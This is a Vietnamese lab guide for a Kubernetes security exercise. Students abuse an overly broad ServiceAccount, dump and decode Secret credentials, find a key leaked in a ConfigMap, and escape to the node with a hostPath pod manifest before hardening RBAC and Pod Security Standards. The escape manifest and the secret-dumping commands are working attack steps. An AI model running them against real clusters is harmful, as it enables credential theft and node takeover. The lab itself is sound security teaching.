# HƯỚNG DẪN THỰC HÀNH — Bảo mật Kubernetes (RBAC, secret, pod escape)

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| Tên lab | `cloud-k8s-rbac` |
| Mức độ | Nâng cao |
| Công cụ | kubectl, base64, jq, curl |

Mục tiêu: lạm dụng ServiceAccount token với RBAC quá rộng để đọc secret, phát hiện secret bị để lẫn trong ConfigMap, tạo pod hostPath thoát ra node lấy flag, rồi hardening cụm.

## 2. Kịch bản

Sinh viên đóng vai attacker có shell trong pod `web-app` (namespace `app`) bị chiếm. Máy `attacker` (172.40.0.10) có terminal, `kubectl` đã trỏ sẵn tới API server của cụm `k8s-node` (172.40.0.20:6443) bằng token của ServiceAccount. Chỉ `attacker` có terminal.

## 3. Kiến thức bổ trợ

RBAC Kubernetes: ServiceAccount + Role/RoleBinding quyết định danh tính được làm gì. Token SA gắn tự động vào pod tại `/var/run/secrets/kubernetes.io/serviceaccount/token`. ConfigMap là dữ liệu cấu hình không nhạy cảm, Secret mới là nơi chứa bí mật — để secret lẫn trong ConfigMap là anti-pattern. `hostPath` mount thư mục node vào pod; `privileged` gỡ cách ly — cả hai là đường thoát ra node. Pod Security Standards (mức `restricted`/`baseline`) chặn pod nguy hiểm. Ánh xạ: MITRE ATT&CK for Containers, CIS Kubernetes Benchmark, OWASP Kubernetes Top 10.

## 4. Các nhiệm vụ của bài thực hành

Khởi động bằng `imodule https://github.com/ptit2026/pen_lab_2026/raw/refs/heads/main/cloud-k8s-rbac.tar`, sau đó `labtainer cloud-k8s-rbac`.

### Nhiệm vụ 1 — `recon_rbac`

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 20; echo
printf "list_secrets=%s\ncreate_pods=%s\n" "$(kubectl auth can-i list secrets -n app)" "$(kubectl auth can-i create pods -n app)" | tee ~/recon.txt
kubectl auth can-i --list -n app
```

Điều kiện: đọc được SA token; `auth can-i` xác nhận ServiceAccount có đồng thời `list secrets` và `create pods` (lưu `~/recon.txt`). Câu hỏi: việc này cho thấy cấu hình RBAC sai thế nào?

### Nhiệm vụ 2 — `loot_secrets`

```bash
{
  kubectl get secret db-credentials -n app -o jsonpath='{.data.username}' | base64 -d; echo
  kubectl get secret db-credentials -n app -o jsonpath='{.data.password}' | base64 -d; echo
  kubectl get configmap app-config -n app -o yaml | grep -iE 'legacy_api_key|secret|key'
} | tee ~/loot.txt
```

Lưu kết quả vào `~/loot.txt` (username/password đã giải mã và dòng secret lẫn trong ConfigMap). Điều kiện: lấy được secret và phát hiện secret trong ConfigMap. Câu hỏi: vì sao để secret trong ConfigMap là anti-pattern?

### Nhiệm vụ 3 — `escape_node`

Soạn manifest pod mount `/` của node qua hostPath, rồi đọc flag:

```bash
cat > /tmp/escape.yaml <<'YML'
apiVersion: v1
kind: Pod
metadata:
  name: maintenance-shell
  namespace: app
spec:
  containers:
  - name: shell
    image: busybox:1.36
    imagePullPolicy: Never
    command: ["sleep", "3600"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
YML
kubectl apply -f /tmp/escape.yaml
kubectl wait --for=condition=Ready pod/maintenance-shell -n app --timeout=180s
kubectl exec maintenance-shell -n app -- cat /host/opt/host-secrets/flag.txt | tee ~/flag.txt
```

Điều kiện: pod `maintenance-shell` Running và đọc được `/opt/host-secrets/flag.txt` trên node (lưu `~/flag.txt`). Câu hỏi: hai thuộc tính nào khiến pod này nguy hiểm?

### Nhiệm vụ 4 — `harden_cluster`

Đội mũ DevSecOps (dùng kubeconfig quyền admin `~/.kube/admin-config`): thu hẹp Role về least-privilege (bỏ quyền secrets/pods), tách secret khỏi ConfigMap, và bật Pod Security Standards mức `restricted`.

```bash
export KUBECONFIG=~/.kube/admin-config
cat > /tmp/least-priv-role.yaml <<'YML'
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: web-app-role
  namespace: app
rules:
  - apiGroups: [""]
    resources: ["configmaps"]
    resourceNames: ["app-config"]
    verbs: ["get"]
YML
kubectl apply -f /tmp/least-priv-role.yaml
kubectl label ns app pod-security.kubernetes.io/enforce=restricted --overwrite
export KUBECONFIG=~/.kube/config
printf "list_secrets_after=%s\ncreate_pods_after=%s\n" "$(kubectl auth can-i list secrets -n app)" "$(kubectl auth can-i create pods -n app)" | tee ~/harden_verify.txt
```

Điều kiện: sau hardening, `kubectl auth can-i list secrets -n app` (với token web) trả về `no` (lưu `~/harden_verify.txt`). Câu hỏi: biện pháp nào chặn được nhiều bước nhất trong chuỗi tấn công?

Sau khi hoàn thành, chạy `checkwork` để kiểm tra kết quả.

## 5. Ánh xạ khung tham chiếu

MITRE ATT&CK for Containers; CIS Kubernetes Benchmark; OWASP Kubernetes Top 10 (RBAC, secrets, pod security).
